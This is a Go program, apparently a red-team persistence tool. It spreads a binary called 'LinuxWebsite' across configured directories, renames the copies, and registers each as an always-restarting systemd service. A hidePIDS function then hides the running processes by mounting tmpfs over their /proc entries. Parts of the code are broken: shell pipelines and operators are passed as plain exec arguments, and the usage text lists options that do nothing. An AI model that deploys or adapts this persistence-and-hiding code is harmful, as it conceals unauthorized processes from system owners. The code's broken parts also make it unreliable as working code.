package main

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
)

// Config struct to hold configuration data
type Config struct {
	Directory   string
	Port        string
	Name        string
	ServiceName string
}

// ReadConfig reads the config file and returns a slice of Config structs
func ReadConfig(filename string) ([]Config, error) {
	var configs []Config

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		values := strings.Split(line, ",")
		config := Config{
			Directory:   values[0],
			Port:        values[1],
			Name:        values[2],
			ServiceName: values[3],
		}
		configs = append(configs, config)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return configs, nil
}

// PrimeVariables primes the variables for the rest of the functions
func PrimeVariables(filename string) ([]Config, error) {
	return ReadConfig(filename)
}

// DistributionFunction copies a file named "LinuxWebsite" to all directories in the config file
func DistributionFunction(configs []Config) {
	sourceFile := "LinuxWebsite"
	successfulCopies := 0

	for _, config := range configs {
		destination := config.Directory + "/" + sourceFile

		// Create the destination directory if it doesn't exist
		if _, err := os.Stat(config.Directory); os.IsNotExist(err) {
			err := os.MkdirAll(config.Directory, 0755)
			if err != nil {
				fmt.Println("Error creating destination directory:", err)
				continue
			}
		}

		// Open the source file for reading
		source, err := os.Open(sourceFile)
		if err != nil {
			fmt.Println("Error opening source file:", err)
			continue
		}
		defer source.Close()

		// Create the destination file
		dest, err := os.Create(destination)
		if err != nil {
			fmt.Println("Error creating destination file:", err)
			continue
		}
		defer dest.Close()

		// Copy the contents of the source file to the destination file
		_, err = io.Copy(dest, source)
		if err != nil {
			fmt.Printf("Error copying file to %s: %v\n", destination, err)
			continue
		}

		// Set execution permissions on the destination file
		err = dest.Chmod(0755)
		if err != nil {
			fmt.Printf("Error setting execution permissions for %s: %v\n", destination, err)
			continue
		}

		fmt.Printf("Successfully copied file to %s\n", destination)
		successfulCopies++
	}

	if successfulCopies == len(configs) {
		fmt.Println("All copies were successful.")
	} else {
		fmt.Printf("Some copies failed. Successfully copied %d out of %d files.\n", successfulCopies, len(configs))
	}
}

// RenamingFunction renames the LinuxWebsite files according to the config file
func RenamingFunction(configs []Config) {
	for _, config := range configs {
		oldName := config.Directory + "/LinuxWebsite"
		newName := config.Directory + "/" + config.Name

		// Rename file
		err := os.Rename(oldName, newName)
		if err != nil {
			fmt.Printf("Error renaming file %s: %v\n", oldName, err)
		} else {
			fmt.Printf("Successfully renamed file from %s to %s\n", oldName, newName)
		}
	}

	fmt.Println("Renaming complete.")
}

/* StartPrograms starts the programs based on the config file
func StartPrograms(configs []Config, pidFile string) {
	// Clear the pid file
	os.WriteFile(pidFile, []byte{}, 0644)

	for _, config := range configs {
		command := exec.Command(config.Directory+"/"+config.Name, config.Port)

		// Run the command as a background process
		err := command.Start()
		if err != nil {
			fmt.Printf("Error starting program %s on port %s: %v\n", config.Name, config.Port, err)
			continue
		}

		// Save the PID to the pid file
		pid := fmt.Sprintf("%d", command.Process.Pid)
		f, err := os.OpenFile(pidFile, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error opening pid file:", err)
			continue
		}
		defer f.Close()

		if _, err = f.WriteString(pid + "\n"); err != nil {
			fmt.Println("Error writing to pid file:", err)
		}

		fmt.Printf("Started program %s on port %s (PID: %s)\n", config.Name, config.Port, pid)
	}

	fmt.Println("Programs started.")
} */

/*
func HideFunction(configs []Config, pidFile string) {
	// Create a systemd service file
	err := createSystemdService(configs)
	if err != nil {
		fmt.Println("Error creating systemd service file:", err)
		return
	}

	// Hide process IDs using the specified Linux command
	err = hidePIDs(pidFile)
	if err != nil {
		fmt.Println("Error hiding process IDs:", err)
		return
	}

	fmt.Println("Hide function complete.")
} */

// createSystemdService creates a systemd service file based on the provided configurations
func createSystemdService(configs []Config) error {
	for _, config := range configs {
		serviceContent := fmt.Sprintf(`[Unit]
Description=%s Website Service
After=network.target

[Service]
ExecStart=%s/%s %s
Restart=always

[Install]
WantedBy=multi-user.target
`, config.Name, config.Directory, config.Name, config.Port)

		serviceFilePath := fmt.Sprintf("/etc/systemd/system/%s.service", config.ServiceName)
		err := os.WriteFile(serviceFilePath, []byte(serviceContent), 0644)
		if err != nil {
			return err
		}

		fmt.Printf("Created systemd service file: %s\n", serviceFilePath)
		fmt.Println("Systemd service started for", config.ServiceName)
	}
	return nil
}

func systemctlReload(configs []Config) {
	cmd := exec.Command("bash -c systemctl daemon-reload")
	cmd.Run()

	for _, config := range configs {
		cmd = exec.Command("bash -c systemctl enable", fmt.Sprintf("%s.service", config.ServiceName))
		cmd.Run()

		cmd = exec.Command("bash -c systemctl start", fmt.Sprintf("%s.service", config.ServiceName))
		cmd.Run()
	}
}

func hidePIDS(configs []Config, pidFile string) error {
	cmd := exec.Command("rm", "pid.txt", "&&", "touch pid.txt", "||", "touch pid.txt")
	err := cmd.Run()
	if err != nil {
		return err
	}

	for _, config := range configs {
		cmd = exec.Command("systemctl", "status", fmt.Sprintf("%s.service", config.ServiceName), "|", "grep", "Main", "|", "awk", "'{print $3}'", ">>", "pid.txt")
		err = cmd.Run()
		if err != nil {
			return err
		}
	}

	pids, err := os.ReadFile(pidFile)
	if err != nil {
		return err
	}

	pidList := string(pids)
	if pidList == "" {
		fmt.Println("No PIDs found in the file.")
		return nil
	}

	// Split the PID list into individual PIDs
	pidArray := strings.Fields(pidList)

	// Iterate through each PID and execute the Linux command
	for _, pid := range pidArray {
		cmd := exec.Command("sh", "-c", fmt.Sprintf(`mount -t tmpfs none /proc/%s`, pid))
		cmd.Run()
		fmt.Printf("Successfully hid process ID %s.\n", pid)
	}

	return err
}

/* hidePIDs hides process IDs using the specified Linux command
func hidePIDs(pidFile string) error {
	pids, err := os.ReadFile(pidFile)
	if err != nil {
		return err
	}

	pidList := string(pids)
	if pidList == "" {
		fmt.Println("No PIDs found in the file.")
		return nil
	}

	// Split the PID list into individual PIDs
	pidArray := strings.Fields(pidList)

	// Iterate through each PID and execute the Linux command
	for _, pid := range pidArray {
		cmd := exec.Command("sh", "-c", fmt.Sprintf(`mount -t tmpfs none /proc/%s`, pid))
		cmd.Run()
		fmt.Printf("Successfully hid process ID %s.\n", pid)
	}

	fmt.Println("Successfully hid all process IDs.")
	return nil
} */

func main() {
	if len(os.Args) < 2 {
		printUsageAndExit()
	}

	option := os.Args[1]

	switch option {
	case "-all":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}

		DistributionFunction(configs)
		RenamingFunction(configs)
		createSystemdService(configs)
		cmd := exec.Command("/usr/bin/systemctl", "daemon-reload")
		err = cmd.Run()
		if err != nil {
			fmt.Println("Error with reload:", err)
			os.Exit(1)
		}

		for _, config := range configs {
			cmd = exec.Command("/usr/bin/systemctl", "enable", config.ServiceName+".service")
			err = cmd.Run()
			if err != nil {
				fmt.Println("Error with enabling:", err)
				os.Exit(1)
			}

			cmd := exec.Command("/usr/bin/systemctl", "start", config.ServiceName+".service")
			err = cmd.Run()
			if err != nil {
				fmt.Println("Error with starting:", err)
				os.Exit(1)
			}
		}

		cmd = exec.Command("touch", "pid.txt")
		cmd.Run()

		for _, config := range configs {
			cmd = exec.Command("bash", "-c", fmt.Sprintf("systemctl status %s.service | grep Main | awk '{print $3}' >> pid.txt", config.ServiceName))
			cmd.Run()
		}

	case "-ld":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}
		DistributionFunction(configs)

	case "-ln":
		configs, err := PrimeVariables("config.txt")
		if err != nil {
			fmt.Println("Error reading config file:", err)
			os.Exit(1)
		}
		RenamingFunction(configs)

	default:
		fmt.Println("Invalid option.")
		printUsageAndExit()
	}
}

func printUsageAndExit() {
	fmt.Println("Usage:")
	fmt.Println("  <program name> -all   : Run all functions in order")
	fmt.Println("  <program name> -ld    : Run distribution function")
	fmt.Println("  <program name> -ln    : Run renaming function")
	fmt.Println("  <program name> -start : Start programs")
	fmt.Println("  <program name> -lh    : Run hide function")
	os.Exit(1)
}
